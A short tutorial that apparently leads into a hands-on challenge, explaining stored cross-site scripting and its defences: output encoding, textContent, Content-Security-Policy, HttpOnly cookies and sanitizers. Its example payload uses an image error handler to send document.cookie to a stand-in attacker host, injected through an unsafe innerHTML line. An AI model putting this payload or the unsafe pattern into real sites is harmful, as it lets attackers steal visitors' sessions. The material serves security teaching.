# How cross-site scripting (XSS) works

XSS happens when an application puts untrusted input into a web page **as HTML** instead of as text.

## Example

A comment box builds its markup like this:

```js
commentDiv.innerHTML = '<div class="comment">' + userInput + '</div>';
```

An attacker posts this comment:

```html
<img src=x onerror="fetch('https://evil.example/steal?c=' + document.cookie)">
```

The image fails to load, `onerror` fires, and the attacker's JavaScript runs **in every visitor's browser, as your site**. It can read tokens, act as the user, or rewrite the page. When the comment is saved and shown to everyone, it is called *stored XSS*.

## The fix: output encoding

Turn the characters that have meaning in HTML into harmless text before inserting them:

| Character | Becomes |
| --- | --- |
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#39;` |

Better still, avoid `innerHTML`: use `element.textContent = userInput`. Frameworks such as React escape for you - until you use `dangerouslySetInnerHTML`.

## Defence in depth

- A strict **Content-Security-Policy** header limits what injected script can do.
- Mark session cookies `HttpOnly` so scripts cannot read them.
- If you must allow rich text, use a maintained sanitizer such as DOMPurify. Never write your own regex filter.

**Next:** open the challenge and attack the comment widget.
